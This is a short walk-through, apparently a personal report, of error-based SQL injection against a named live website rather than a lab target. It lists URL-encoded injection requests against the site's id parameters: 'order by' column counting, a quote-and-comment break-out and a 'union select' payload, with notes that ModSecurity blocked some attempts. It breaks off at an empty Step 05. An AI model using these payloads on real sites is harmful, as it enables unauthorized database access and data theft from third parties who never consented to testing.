## Introduction
#### Purpose of the Report

This walk-through demonstrates how to identify vulnerabilities, exploit them, and gain access to website, using error based SQL injection.

Target Website
https://aquacity.com.pk/

### Steps

#### Step 01 : finding the php id
outcome: https://aquacity.com.pk/page.php?id=3 

#### Step 02 : to check numbers of page availabe we are going to use order by

https://aquacity.com.pk/page.php?id=3%20order%20by%205
.
.
https://aquacity.com.pk/page.php?id=3%20order%20by%20100

outcome: no outcome of this command as it is been blocked.

#### Step 03 : lets do it with ' --+
https://aquacity.com.pk/products.php?id=3%27%20order%20by%205%20--+

outcome: 5 pages discovered.

#### Step 04 : applying "union select" 
https://aquacity.com.pk/products.php?id=3%27%20union%20select%201,2,3,4,5--+
<img width="1080" height="359" alt="image" src="https://github.com/user-attachments/assets/84bdc2cd-eaeb-45fb-9cd2-1873e97e54f4" />

error encountered, the commands are blocked by mod security.

#### Step 05 : 
